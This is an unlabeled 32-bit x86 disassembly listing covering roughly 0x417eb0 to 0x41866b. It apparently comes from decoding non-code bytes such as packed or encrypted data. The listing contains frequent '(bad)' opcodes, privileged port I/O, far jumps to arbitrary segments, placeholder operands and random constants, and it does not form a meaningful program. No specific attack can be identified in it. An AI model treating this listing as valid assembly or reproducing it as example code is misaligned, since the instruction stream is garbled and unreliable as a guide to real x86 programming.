  417eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eb1:	adc    DWORD PTR [edi+0x50],esp
  417eb4:	jb     0x417edc
  417eb6:	jg     0x417f2e
  417eb8:	mov    al,ds:0x9a71cfa9
  417ebd:	repnz aam 0xbb
  417ec0:	xor    DWORD PTR ds:0x925d7cc4,0xffffffd7
  417ec7:	out    0x33,al
  417ec9:	popf   
  417eca:	enter  0xfabc,0xd5
  417ece:	fbstp  TBYTE PTR [edi]
  417ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ed1:	dec    ecx
  417ed2:	fsub   QWORD PTR [edx-0x26]
  417ed5:	(bad)  
  417ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ed7:	out    0x70,eax
  417ed9:	pop    eax
  417eda:	sub    dh,BYTE PTR [ebx+0x47ea7267]
  417ee0:	shr    BYTE PTR [ebx+0x2f8b6a8f],0xb5
  417ee7:	das    
  417ee8:	ror    DWORD PTR [ebx-0x31],1
  417eeb:	add    ebp,DWORD PTR [edi-0x950cbe8]
  417ef1:	leave  
  417ef2:	jmp    0xee57:0xb74aada5
  417ef9:	push   edi
  417efa:	fs xchg eax,esi
  417efd:	fsub   QWORD PTR ds:0x55b0bec8
  417f03:	mov    WORD PTR [eax+ecx*8-0x1607b612],ds
  417f0a:	sahf   
  417f0b:	punpckhwd mm0,QWORD PTR [edx+0x74]
  417f0f:	xchg   ebx,eax
  417f10:	sub    eax,0xa9a4dab0
  417f15:	mov    ?,WORD PTR [eax-0x48]
  417f18:	dec    ebx
  417f19:	jle    0x417f67
  417f1b:	inc    ebp
  417f1c:	xchg   ecx,eax
  417f1d:	add    al,bh
  417f1f:	std    
  417f20:	jecxz  0x417f73
  417f22:	jg     0x417ee5
  417f24:	dec    edi
  417f25:	jecxz  0x417f9f
  417f27:	iret   
  417f28:	dec    eax
  417f29:	nop
  417f2a:	xlat   BYTE PTR ds:[ebx]
  417f2b:	dec    eax
  417f2c:	mov    ecx,0x2b634a79
  417f31:	push   ds
  417f32:	rol    esi,1
  417f34:	jns    0x417efc
  417f36:	shr    DWORD PTR [ebx+0x3f5608d9],1
  417f3c:	btc    DWORD PTR [esi+0x1b],0x73
  417f41:	repnz xor edx,esi
  417f44:	push   ecx
  417f45:	sub    DWORD PTR [edx],ebp
  417f47:	mov    edi,0xddce542d
  417f4c:	mov    ebp,0x11577a9f
  417f51:	xchg   ebx,eax
  417f52:	cmp    ebx,eax
  417f54:	mov    bl,0x69
  417f56:	push   edx
  417f57:	sub    al,0xe1
  417f59:	leave  
  417f5a:	jmp    0x13f9:0xd5116d5e
  417f61:	add    eax,0x1b4c7212
  417f66:	push   0x2472c2b4
  417f6b:	or     esi,esp
  417f6d:	stos   BYTE PTR es:[edi],al
  417f6e:	aas    
  417f6f:	test   eax,0x450b74ec
  417f74:	jnp    0x417ff5
  417f76:	and    eax,0x6eca2a26
  417f7b:	aas    
  417f7c:	aas    
  417f7d:	mov    edi,0xcfe05927
  417f82:	fs inc esp
  417f84:	(bad)  
  417f85:	sbb    eax,0x493b3913
  417f8a:	jmp    0x4efe:0x9f86ed32
  417f91:	inc    ecx
  417f92:	hlt    
  417f93:	jp     0x417f8a
  417f95:	fwait
  417f96:	mov    ebp,0x3b1c60a4
  417f9b:	xchg   edx,eax
  417f9c:	gs lock stos DWORD PTR es:[edi],eax
  417f9f:	stc    
  417fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fa1:	inc    edi
  417fa2:	inc    edx
  417fa3:	fidiv  WORD PTR [ebp+0xc]
  417fa6:	mov    BYTE PTR [ebp+0x6c],al
  417fa9:	rol    DWORD PTR [edi-0x28],0x6e
  417fad:	or     dh,BYTE PTR [esi]
  417faf:	add    dl,BYTE PTR [eax-0xe]
  417fb2:	rcl    dh,1
  417fb4:	xor    al,0x70
  417fb6:	cmp    al,0x1
  417fb8:	add    DWORD PTR [eax],esi
  417fba:	jnp    0x417f9a
  417fbc:	cmc    
  417fbd:	adc    eax,0xf681845a
  417fc2:	mov    ds:0x378a3e37,eax
  417fc7:	sub    eax,0xa29e3a5a
  417fcc:	repz pop ebx
  417fce:	xchg   ebx,eax
  417fcf:	or     DWORD PTR fs:[esi-0x478dc6af],ebp
  417fd6:	pushf  
  417fd7:	stc    
  417fd8:	mov    al,ds:0x4ff7112e
  417fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fde:	or     al,BYTE PTR [ebx+0x564743ca]
  417fe4:	enter  0x8dfe,0x26
  417fe8:	mov    cl,ch
  417fea:	xchg   edi,eax
  417feb:	sub    al,0xfc
  417fed:	dec    di
  417fef:	cmp    BYTE PTR [edi+0x2f],cl
  417ff2:	jb     0x41801e
  417ff4:	inc    esp
  417ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ff6:	stos   BYTE PTR es:[edi],al
  417ff7:	popf   
  417ff8:	and    BYTE PTR [edx-0x23],al
  417ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffc:	lods   eax,DWORD PTR ds:[esi]
  417ffd:	push   esp
  417ffe:	adc    eax,DWORD PTR [edi]
  418000:	aas    
  418001:	icebp  
  418002:	mov    dl,0x1f
  418004:	sub    BYTE PTR [ebx-0x55],0xaf
  418008:	jl     0x418004
  41800a:	dec    edx
  41800b:	mov    dl,0x91
  41800d:	stc    
  41800e:	mov    ecx,0xb752e400
  418013:	jnp    0x418037
  418015:	push   edi
  418016:	jmp    0x41806d
  418018:	in     eax,0x9b
  41801a:	mov    esi,0xabbb41ba
  41801f:	je     0x41805c
  418021:	outs   dx,BYTE PTR ds:[esi]
  418022:	dec    esp
  418023:	stos   DWORD PTR es:[edi],eax
  418024:	stos   DWORD PTR es:[edi],eax
  418025:	jnp    0x417fd2
  418027:	jae    0x418082
  418029:	ret    
  41802a:	mov    ecx,0xee7b3bf9
  41802f:	inc    esp
  418030:	xchg   edi,eax
  418031:	enter  0xb9a2,0x62
  418035:	imul   ebp,edx,0x1818643a
  41803b:	lds    esp,FWORD PTR [ebx-0x5a]
  41803e:	out    0x47,eax
  418040:	push   edx
  418041:	cmp    ebx,edi
  418043:	and    edi,DWORD PTR [eax+esi*2]
  418046:	jne    0x418040
  418048:	or     edx,DWORD PTR [ebp-0x65]
  41804b:	in     eax,dx
  41804c:	call   0x86b4b99a
  418051:	loop   0x41808c
  418053:	lods   al,BYTE PTR ds:[esi]
  418054:	sbb    ah,BYTE PTR [ecx-0x57]
  418057:	xor    BYTE PTR [edx+0x74],dl
  41805a:	mov    eax,ds:0xc1c58da
  41805f:	sbb    BYTE PTR [eax],cl
  418061:	xor    eax,0x5039ec38
  418066:	loope  0x4180df
  418068:	jg     0x41801a
  41806a:	frstor [ebx-0x5c35268c]
  418070:	mov    al,0xce
  418072:	or     BYTE PTR [edx],dl
  418074:	adc    al,BYTE PTR ds:[edi-0x64157eab]
  41807b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41807c:	std    
  41807d:	xchg   ebp,eax
  41807e:	mov    eax,ds:0x32208c6f
  418083:	in     al,0x9
  418085:	ror    DWORD PTR [esi],1
  418087:	(bad)  
  418088:	clc    
  418089:	fist   DWORD PTR [esi+0x2f]
  41808c:	addr16 daa 
  41808e:	jo     0x418094
  418090:	dec    edi
  418091:	not    BYTE PTR [ecx]
  418093:	push   0xfb437b61
  418098:	sub    DWORD PTR [ecx+0x6f],ebp
  41809b:	rep stos DWORD PTR es:[edi],eax
  41809d:	inc    esp
  41809e:	mov    esi,0x6ffa60cf
  4180a4:	pop    esi
  4180a5:	sub    al,0xc0
  4180a7:	push   ebp
  4180a8:	xor    BYTE PTR [ebp+0x5612fd10],bh
  4180ae:	lahf   
  4180af:	jnp    0x4180a4
  4180b1:	pop    ds
  4180b2:	lock loop 0x4180a1
  4180b5:	xor    al,0xc8
  4180b7:	clc    
  4180b8:	cdq    
  4180b9:	sub    ebp,DWORD PTR [edx+0x4b]
  4180bc:	xchg   DWORD PTR [edi-0x316f443e],ebp
  4180c2:	lds    eax,FWORD PTR [ebx+0x830417e]
  4180c8:	dec    edx
  4180c9:	ins    BYTE PTR es:[edi],dx
  4180ca:	mov    esi,0x589a248f
  4180cf:	or     DWORD PTR [ecx+0x10],0xebe1a814
  4180d6:	add    bl,BYTE PTR [ecx+0x1d47d30e]
  4180dc:	inc    eax
  4180dd:	sbb    al,0x46
  4180df:	test   BYTE PTR gs:[edi],ch
  4180e2:	dec    edx
  4180e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180e4:	scas   eax,DWORD PTR es:[edi]
  4180e5:	repnz pop ecx
  4180e7:	cmp    bh,ah
  4180e9:	bound  ebx,QWORD PTR [ecx-0x16]
  4180ec:	xor    dh,BYTE PTR [esi+ebp*4+0x5456d390]
  4180f3:	pop    edi
  4180f4:	clc    
  4180f5:	mov    esp,DWORD PTR [ecx-0x12]
  4180f8:	repz hlt 
  4180fa:	loope  0x4180c2
  4180fc:	adc    ecx,0x20fadaf2
  418102:	fisttp QWORD PTR [edi+0x6eed21fc]
  418108:	out    0xc6,eax
  41810a:	std    
  41810b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41810c:	fcmove st,st(2)
  41810e:	xchg   ebx,eax
  41810f:	aaa    
  418110:	aad    0xae
  418112:	pop    ebp
  418113:	lds    ecx,FWORD PTR ss:[ecx-0x520d669b]
  41811a:	in     eax,dx
  41811b:	push   ds
  41811c:	call   0x7793:0xf05e4b9c
  418123:	xor    ebp,esp
  418125:	fld    TBYTE PTR ds:0x3fafcf79
  41812b:	arpl   bx,dx
  41812d:	mov    DWORD PTR [eax-0x1fc374d8],0x7dd8d8f4
  418137:	add    edi,DWORD PTR [edi-0x14]
  41813a:	int3   
  41813b:	scas   eax,DWORD PTR es:[edi]
  41813c:	ss pop ebp
  41813e:	mov    eax,0x298186ec
  418143:	dec    ecx
  418144:	push   edi
  418145:	(bad)  [esi]
  418147:	and    al,0xd8
  418149:	test   al,0xb8
  41814b:	xchg   esp,eax
  41814c:	dec    ebp
  41814d:	loop   0x4180e4
  41814f:	cli    
  418150:	cmp    eax,0x7ea2ee62
  418155:	outs   dx,BYTE PTR ds:[esi]
  418156:	push   esi
  418157:	div    BYTE PTR [ecx+0x5e]
  41815a:	inc    esp
  41815b:	cmp    ecx,ebx
  41815d:	es mov al,0xe1
  418160:	mov    cl,0x4c
  418162:	pop    edi
  418163:	ret    
  418164:	fnsave [esi+0x58a4e41d]
  41816a:	retf   
  41816b:	mov    dl,0x10
  41816d:	pop    eax
  41816e:	lods   al,BYTE PTR ds:[esi]
  41816f:	cwde   
  418170:	cld    
  418171:	imul   BYTE PTR [ebp+0xf1678eb]
  418177:	or     esp,DWORD PTR [edi]
  418179:	repz clc 
  41817b:	js     0x4181a1
  41817d:	xor    ebx,DWORD PTR [esi-0x10]
  418180:	mov    esp,0x42c8840f
  418185:	xchg   DWORD PTR [edx],edx
  418187:	pop    ss
  418188:	mov    al,0xf5
  41818a:	dec    ebx
  41818b:	jo     0x41811a
  41818d:	fcomip st,st(7)
  41818f:	fnsave [esi+0x1d]
  418192:	cmp    eax,0x13
  418195:	retf   0x73d0
  418198:	mov    esp,0x450a4b19
  41819d:	iret   
  41819e:	sbb    eax,0xbe08db39
  4181a3:	and    eax,0xdb45e55a
  4181a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a9:	leave  
  4181aa:	stos   BYTE PTR es:[edi],al
  4181ab:	inc    esi
  4181ac:	bound  ebx,QWORD PTR [ecx+0x31]
  4181af:	mov    eax,ds:0xeee457d4
  4181b4:	push   cs
  4181b5:	jmp    0x418178
  4181b7:	pop    edx
  4181b8:	push   ss
  4181b9:	jae    0x4181aa
  4181bb:	mov    esi,0x4a38add7
  4181c0:	mov    ds:0xa912ecce,al
  4181c5:	mov    dh,0x5
  4181c7:	popf   
  4181c8:	dec    ecx
  4181c9:	xor    dh,ch
  4181cb:	or     eax,DWORD PTR [esi+0x1cad3db3]
  4181d1:	aam    0x41
  4181d3:	sub    ah,BYTE PTR [edx]
  4181d5:	pop    es
  4181d6:	jl     0x41815c
  4181d8:	fs or  eax,0xb96e508a
  4181de:	or     eax,0xf30c042a
  4181e3:	dec    esi
  4181e4:	jmp    0xdeda:0xacc8858f
  4181eb:	in     al,0x83
  4181ed:	daa    
  4181ee:	sub    ebx,edi
  4181f0:	adc    al,BYTE PTR [esi+esi*4]
  4181f3:	les    ecx,FWORD PTR [eax+0x3bf1da5f]
  4181f9:	sbb    esp,DWORD PTR [edi-0x2d90222b]
  4181ff:	sub    ecx,esi
  418201:	or     ch,BYTE PTR [eax-0x5d]
  418204:	fdivr  QWORD PTR [esi+0x7d]
  418207:	push   edx
  418208:	sar    ah,0xf4
  41820b:	push   eax
  41820c:	adc    eax,0xd931d298
  418211:	dec    eax
  418212:	mov    ds:0x91593add,al
  418217:	add    al,0x24
  418219:	retf   
  41821a:	arpl   bp,bp
  41821c:	sub    BYTE PTR ds:0xcba2959d,al
  418222:	(bad)
  418226:	pop    eax
  418227:	pop    es
  418228:	mov    cl,0xa3
  41822a:	xor    ebx,esi
  41822c:	rcr    BYTE PTR [ebp+0x630c88b2],1
  418232:	sub    DWORD PTR [ecx-0x51],ebp
  418235:	adc    cl,dl
  418237:	les    eax,FWORD PTR [edi+edx*8+0x3c]
  41823b:	cmp    eax,0xb5199bbd
  418240:	arpl   di,bx
  418242:	xor    eax,0x9a193a4d
  418247:	pop    ebx
  418248:	(bad)  
  418249:	xor    eax,0xc06a9980
  41824e:	aam    0x97
  418250:	clc    
  418251:	int3   
  418252:	mov    ebp,0x25acab17
  418257:	lock push 0xfffffff8
  41825a:	xor    eax,0x9707005b
  41825f:	sbb    al,0xc9
  418261:	fimul  WORD PTR [edi+0x33]
  418264:	cwde   
  418265:	xor    al,0x8
  418267:	add    al,0xc1
  418269:	jo     0x418224
  41826b:	into   
  41826c:	push   edx
  41826d:	cmp    eax,esp
  41826f:	sahf   
  418270:	or     esp,DWORD PTR ds:0xa736
  418275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418276:	mov    ds:0xbd07a3e4,al
  41827b:	fmulp  st(5),st
  41827d:	push   cs
  41827e:	ss loop 0x418238
  418281:	mov    ds:0x8345f7a2,eax
  418286:	cmp    eax,0x60f4997f
  41828b:	add    esi,DWORD PTR [esi]
  41828d:	pop    ss
  41828e:	jae    0x41827b
  418290:	xchg   edi,eax
  418291:	cs dec esp
  418293:	and    al,0x27
  418295:	cmp    eax,0xd5ccb59c
  41829a:	xchg   edi,eax
  41829b:	adc    ebp,DWORD PTR cs:[edi-0x66b13165]
  4182a2:	scas   eax,DWORD PTR es:[edi]
  4182a3:	dec    ebx
  4182a4:	les    ebx,FWORD PTR [ecx]
  4182a6:	or     dh,BYTE PTR [eax+0x55b759cf]
  4182ac:	aad    0xc5
  4182ae:	push   esi
  4182af:	jp     0x418306
  4182b1:	sub    DWORD PTR [eax],0xb
  4182b4:	js     0x418264
  4182b6:	in     al,0x5d
  4182b8:	fild   QWORD PTR [esi+0x653da462]
  4182be:	push   edx
  4182bf:	or     ah,BYTE PTR [esi+0x74127256]
  4182c5:	cmp    eax,0x71a1ebb5
  4182ca:	sub    BYTE PTR [ecx],bl
  4182cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182cd:	xchg   ebx,eax
  4182ce:	les    ebp,FWORD PTR [esp+eax*2+0x3d51f31f]
  4182d5:	data16 out dx,al
  4182d7:	and    ah,BYTE PTR [edx-0x507892a9]
  4182dd:	xchg   ebx,eax
  4182de:	rol    BYTE PTR [ebx],cl
  4182e0:	mov    WORD PTR [esi-0x26],?
  4182e3:	xlat   BYTE PTR ds:[ebx]
  4182e4:	lods   al,BYTE PTR ds:[esi]
  4182e5:	fcomi  st,st(3)
  4182e7:	dec    edx
  4182e8:	enter  0x98a2,0x92
  4182ec:	aad    0xa6
  4182ee:	mov    eax,0xd582dfb2
  4182f3:	(bad)  
  4182f4:	or     esi,0x4
  4182f7:	arpl   dx,cx
  4182f9:	pop    edi
  4182fa:	scas   eax,DWORD PTR es:[edi]
  4182fb:	push   eax
  4182fc:	jg     0x41836f
  4182fe:	mov    ah,0x41
  418300:	mov    esp,0xcbae7ee2
  418305:	mov    eax,0xa45be618
  41830a:	outs   dx,DWORD PTR ds:[esi]
  41830b:	pop    ss
  41830c:	dec    esi
  41830d:	dec    ebp
  41830e:	or     dl,BYTE PTR [edi]
  418310:	stos   DWORD PTR es:[edi],eax
  418311:	jns    0x4182ef
  418313:	push   eax
  418314:	ins    DWORD PTR es:[edi],dx
  418315:	lods   eax,DWORD PTR ds:[esi]
  418316:	test   DWORD PTR [ecx-0x543bab3],0x123fbc9d
  418320:	adc    ebx,DWORD PTR [eax-0x4e]
  418323:	test   eax,0x4d7de418
  418328:	mov    ecx,0x9f096861
  41832d:	in     eax,0xf2
  41832f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418330:	ficom  WORD PTR [esi-0x28481131]
  418336:	mov    eax,ds:0x2504cf97
  41833b:	jmp    0x4182c1
  41833d:	rol    BYTE PTR [ebx],0xa7
  418340:	scas   eax,DWORD PTR es:[edi]
  418341:	mov    cl,cl
  418343:	pushf  
  418344:	jecxz  0x4182d1
  418346:	mov    WORD PTR [eax],?
  418348:	cmp    eax,0x4028b2f7
  41834d:	arpl   WORD PTR [edi-0x26dd6ca3],ax
  418353:	sti    
  418354:	sub    eax,DWORD PTR [eax+eiz*1]
  418357:	cs xchg ecx,eax
  418359:	loopne 0x418382
  41835b:	in     al,dx
  41835c:	dec    ebp
  41835d:	mov    al,ds:0xab9d7746
  418362:	pop    eax
  418363:	adc    eax,ebx
  418365:	sbb    esp,esp
  418367:	cmp    BYTE PTR [ebx-0x7],cl
  41836a:	fld    st(4)
  41836c:	mov    ds:0x916e7f,eax
  418371:	test   BYTE PTR [edi+0x3243cb8a],bh
  418377:	jmp    FWORD PTR [ecx]
  418379:	inc    ecx
  41837a:	add    BYTE PTR [eax+0x497354a5],bl
  418380:	cmp    DWORD PTR [edx+0x11],ecx
  418383:	aaa    
  418384:	imul   esp,edi,0x2547a126
  41838a:	inc    ebx
  41838b:	shl    BYTE PTR [ecx],0xbd
  41838e:	mov    ebp,0x8ec0c098
  418393:	retf   
  418394:	ds cwde 
  418396:	mov    eax,ds:0x11030d60
  41839b:	sub    BYTE PTR [edx+eiz*4+0xaf9129e],0x6
  4183a3:	inc    esi
  4183a4:	fstp   DWORD PTR [edx+0x4e]
  4183a7:	xchg   DWORD PTR [ebx-0x7f],esi
  4183aa:	cwde   
  4183ab:	mov    al,ds:0x98248ea0
  4183b0:	clc    
  4183b1:	sbb    ecx,DWORD PTR [ecx]
  4183b3:	mov    bl,0x39
  4183b5:	xchg   edi,eax
  4183b6:	stos   BYTE PTR es:[edi],al
  4183b7:	sbb    al,BYTE PTR [eax+edx*2-0x75]
  4183bb:	nop
  4183bc:	stos   DWORD PTR es:[edi],eax
  4183bd:	shl    DWORD PTR [edi],0x1e
  4183c0:	jns    0x41837b
  4183c2:	jbe    0x4183c1
  4183c4:	cmp    eax,0xe9aa9c35
  4183c9:	or     edi,ebx
  4183cb:	lahf   
  4183cc:	sahf   
  4183cd:	lahf   
  4183ce:	cdq    
  4183cf:	push   esi
  4183d0:	pop    es
  4183d1:	loope  0x4183a0
  4183d3:	sahf   
  4183d4:	push   ebp
  4183d5:	shl    DWORD PTR [ebp+0x202f2d75],1
  4183db:	cmp    DWORD PTR [edx+0x34],ebp
  4183de:	xchg   esp,eax
  4183df:	mov    ah,0xfe
  4183e1:	mov    ds:0xdcca3033,eax
  4183e6:	mov    dl,0xca
  4183e8:	mov    bl,0x7b
  4183ea:	lods   eax,DWORD PTR ds:[esi]
  4183eb:	sub    BYTE PTR [ebx],0x50
  4183ee:	mov    dh,0x46
  4183f0:	bound  eax,QWORD PTR [edi]
  4183f2:	pusha  
  4183f3:	ja     0x41846b
  4183f5:	jbe    0x418392
  4183f7:	int    0x6f
  4183f9:	mov    ds:0x4c06cb3c,al
  4183fe:	mov    ds:0xbfd65b69,al
  418403:	inc    esp
  418404:	es ins DWORD PTR es:[edi],dx
  418406:	je     0x418463
  418408:	inc    ecx
  418409:	pop    edi
  41840a:	out    0xd7,eax
  41840c:	lea    esi,[esi-0xc38c021]
  418412:	rol    bh,cl
  418414:	dec    esi
  418415:	in     al,0x80
  418417:	dec    edi
  418418:	push   0x12
  41841a:	addr16 push esp
  41841c:	or     ecx,DWORD PTR [ecx-0x1]
  41841f:	mov    dl,0xc9
  418421:	test   al,0xb8
  418423:	inc    esi
  418424:	setbe  dl
  418427:	pop    ds
  418428:	cmp    eax,0x7daabd1a
  41842d:	push   esp
  41842e:	cmp    al,0x78
  418430:	cli    
  418431:	jnp    0x418478
  418433:	fdiv   DWORD PTR [ebx-0x74b09a5f]
  418439:	aam    0xfd
  41843b:	xchg   esi,eax
  41843c:	dec    esi
  41843d:	pop    edx
  41843e:	arpl   si,bx
  418440:	push   cs
  418441:	jmp    0xabcf:0x78f9b342
  418448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41844a:	leave  
  41844b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41844c:	jne    0x418458
  41844e:	test   al,0x6
  418450:	cmp    DWORD PTR [ebx-0x3c],eax
  418453:	push   ebp
  418454:	in     eax,0xd6
  418456:	xchg   esi,eax
  418457:	mov    esi,0x54facb54
  41845c:	sbb    ebx,DWORD PTR [ecx+0xf565adb]
  418462:	dec    ebx
  418463:	xchg   ebp,eax
  418464:	xchg   ecx,eax
  418465:	mov    eax,ds:0x134d69c4
  41846a:	lock imul eax,DWORD PTR [edi+edx*2-0x7f32c66d],0xffffffb0
  418473:	icebp  
  418474:	push   esi
  418475:	rcl    DWORD PTR [edx-0x5f],0x5b
  418479:	xchg   ebp,eax
  41847a:	mov    edi,ebx
  41847c:	push   es
  41847d:	mov    dl,0xc0
  41847f:	lock sahf 
  418481:	sbb    eax,0x71e2bbe6
  418486:	and    BYTE PTR [ebx+0x37],dh
  418489:	ret    0xbe29
  41848c:	and    eax,0xa08ebc85
  418491:	popf   
  418492:	fisttp DWORD PTR [esi-0x7a54757a]
  418498:	mov    eax,0xad03c9c
  41849d:	ins    DWORD PTR es:[edi],dx
  41849e:	popa   
  41849f:	(bad)  
  4184a0:	push   esp
  4184a1:	pusha  
  4184a2:	xlat   BYTE PTR ds:[ebx]
  4184a3:	shr    DWORD PTR [esi+0x1e],0x1f
  4184a7:	lds    ebx,FWORD PTR [edx]
  4184a9:	sbb    DWORD PTR [esi],esp
  4184ab:	fdiv   st,st(4)
  4184ad:	int    0x41
  4184af:	add    BYTE PTR [edx+0x679579bf],ah
  4184b5:	inc    eax
  4184b6:	jno    0x4184db
  4184b8:	in     al,0x26
  4184ba:	jmp    0xc872dfbb
  4184bf:	stc    
  4184c0:	aaa    
  4184c1:	dec    edi
  4184c2:	adc    ecx,DWORD PTR [ecx]
  4184c4:	out    0x1b,al
  4184c6:	sbb    edi,DWORD PTR [ebx-0x11]
  4184c9:	lds    ebp,FWORD PTR [esi]
  4184cb:	pop    eax
  4184cc:	add    BYTE PTR gs:[edi+0x3c],bh
  4184d0:	hlt    
  4184d1:	fsubr  QWORD PTR [edx+0x138829da]
  4184d7:	pop    es
  4184d8:	das    
  4184d9:	pop    edi
  4184da:	xchg   edi,eax
  4184db:	rcl    DWORD PTR [ebp+0x6f],1
  4184de:	stos   DWORD PTR es:[edi],eax
  4184df:	cmp    cl,BYTE PTR [ecx+0xe]
  4184e2:	test   BYTE PTR [edi+0x4c],ah
  4184e5:	or     DWORD PTR [ebx],ebx
  4184e7:	or     ch,BYTE PTR [eax]
  4184e9:	or     al,0xe9
  4184eb:	pop    ebx
  4184ec:	mov    cs,WORD PTR [edi+0x16]
  4184ef:	nop
  4184f0:	dec    edi
  4184f1:	mov    al,ds:0xcfa3c11c
  4184f6:	dec    esp
  4184f7:	dec    esp
  4184f8:	push   esi
  4184f9:	cmp    al,0x73
  4184fb:	ror    al,cl
  4184fd:	jp     0x4184b3
  4184ff:	aam    0xec
  418501:	add    al,0x74
  418503:	stos   BYTE PTR es:[edi],al
  418504:	jb     0x418559
  418506:	jb     0x418501
  418508:	cmp    eax,0xd979f17d
  41850d:	adc    ebx,DWORD PTR [eax+0x26e71b7a]
  418513:	mov    ebx,0xb9f3351e
  418518:	fnstsw WORD PTR [edx]
  41851a:	xchg   esp,eax
  41851b:	test   esi,ebp
  41851d:	pop    ss
  41851e:	adc    al,0x27
  418520:	mov    ecx,0x440b5aa7
  418525:	mov    cs,WORD PTR [ebp+esi*4+0x75]
  418529:	int3   
  41852a:	sbb    cl,ch
  41852c:	imul   BYTE PTR [ebp-0x46]
  41852f:	mov    eax,ds:0xcb253b9a
  418534:	das    
  418535:	test   dl,0xef
  418538:	jb     0x41858f
  41853a:	push   edi
  41853b:	cmp    BYTE PTR [esi+0x4f7b3f4d],dh
  418541:	popf   
  418542:	and    al,0xc5
  418544:	outs   dx,DWORD PTR ds:[esi]
  418545:	outs   dx,DWORD PTR ds:[esi]
  418546:	xchg   edi,eax
  418547:	enter  0xfc6,0x5c
  41854b:	inc    ecx
  41854c:	dec    ecx
  41854d:	imul   esi,eax,0x39
  418550:	push   esi
  418551:	sbb    eax,0x22097815
  418556:	in     eax,dx
  418557:	cld    
  418558:	cmp    edx,DWORD PTR [edx+0x75]
  41855b:	pop    edx
  41855c:	inc    ecx
  41855d:	jmp    0x41855d
  41855f:	in     eax,dx
  418560:	aam    0x71
  418562:	outs   dx,DWORD PTR ds:[esi]
  418563:	sti    
  418564:	xchg   edx,eax
  418565:	std    
  418566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418567:	cmc    
  418568:	sbb    edx,DWORD PTR [ecx+0x44]
  41856b:	and    BYTE PTR [ebp-0x65],dl
  41856e:	outs   dx,BYTE PTR ds:[esi]
  41856f:	gs push ebp
  418571:	js     0x418590
  418573:	mov    esp,edx
  418575:	(bad)  
  418576:	sbb    eax,0xb5df9a7d
  41857b:	xor    dl,BYTE PTR [esi+0x26]
  41857e:	pusha  
  41857f:	loope  0x4185bc
  418581:	push   ebx
  418582:	push   eax
  418584:	sbb    eax,0x6014423
  418589:	jne    0x41858b
  41858b:	popf   
  41858c:	jge    0x4185e4
  41858e:	(bad)  
  41858f:	mov    ebp,DWORD PTR [ebx+edx*2-0x63431ad9]
  418596:	push   0x7
  418598:	out    0x65,al
  41859a:	cmp    al,0xa4
  41859c:	mov    bh,0x7f
  41859e:	into   
  41859f:	and    al,0xb6
  4185a1:	sub    BYTE PTR [edi-0x57f6e2a8],dh
  4185a7:	jno    0x418622
  4185a9:	cmp    ah,BYTE PTR [esi-0x1d]
  4185ac:	lock gs pop ds
  4185af:	fsubp  st(2),st
  4185b1:	mov    edx,0xed25fa42
  4185b6:	icebp  
  4185b7:	retf   0x5067
  4185ba:	shl    DWORD PTR [edi],1
  4185bc:	jg     0x418549
  4185be:	adc    BYTE PTR [eax-0x3d],0x28
  4185c2:	loope  0x41854d
  4185c4:	mov    edx,0xb09acde6
  4185c9:	ds add bl,al
  4185cc:	mov    ds:0x334fd26d,eax
  4185d1:	push   ss
  4185d2:	xor    bl,cl
  4185d4:	bnd jne 0x4185b5
  4185d7:	or     eax,eax
  4185d9:	and    ebp,DWORD PTR [ebx+0x70]
  4185dc:	leave  
  4185dd:	inc    esp
  4185de:	cmp    al,0xe6
  4185e0:	clc    
  4185e1:	std    
  4185e2:	cmp    BYTE PTR [edi+eiz*8+0x47],bh
  4185e6:	mov    ah,0x43
  4185e8:	xor    ebp,0x59
  4185eb:	data16 stc 
  4185ed:	xor    eax,edx
  4185ef:	bound  ebx,QWORD PTR [ebx-0x4b]
  4185f2:	fcom   DWORD PTR [ebx]
  4185f4:	bound  edi,QWORD PTR [edi-0x2a02b474]
  4185fa:	pop    ebx
  4185fb:	cdq    
  4185fc:	adc    dl,dl
  4185fe:	int    0x4f
  418600:	or     esi,DWORD PTR [ebp+0x7df73083]
  418606:	(bad)  
  418608:	add    al,0x75
  41860a:	inc    esi
  41860b:	pushf  
  41860c:	and    al,0xec
  41860e:	dec    DWORD PTR [esi-0x71]
  418611:	sbb    al,dh
  418613:	or     esp,eax
  418615:	and    bl,BYTE PTR [edi-0x6e7303e4]
  41861b:	dec    esp
  41861c:	cmp    DWORD PTR [ebx],ecx
  41861e:	push   ds
  41861f:	inc    esp
  418620:	cmp    ah,cl
  418622:	cmp    edi,DWORD PTR [eax]
  418624:	rcl    BYTE PTR [esi],0xe6
  418627:	(bad)  
  418628:	adc    BYTE PTR [ebp-0x1e],ch
  41862b:	xor    eax,0xbbb599fe
  418630:	dec    eax
  418631:	test   cl,al
  418633:	xchg   ebx,eax
  418634:	jae    0x41862f
  418636:	in     eax,0xec
  418638:	mov    ebx,0x4dc51fec
  41863d:	(bad)  
  41863e:	rol    DWORD PTR [esi+ebp*1-0x2c],cl
  418642:	out    0x7c,al
  418644:	fisubr WORD PTR [ebp+eax*2-0xe]
  418648:	xchg   esp,eax
  418649:	jge    0x4185d2
  41864b:	jg     0x4186c6
  41864d:	push   edi
  41864e:	daa    
  41864f:	jb     0x418675
  418651:	pop    eax
  418652:	mov    al,ds:0x49a6069a
  418657:	jbe    0x4185fe
  418659:	push   0x2ff3c7b7
  41865e:	mov    ah,0x7
  418660:	outs   dx,DWORD PTR ds:[esi]
  418661:	jle    0x41866e
  418663:	inc    ebx
  418664:	(bad)  
  418665:	fbstp  TBYTE PTR [eax+0x7189c996]
  41866b:	pop    esi
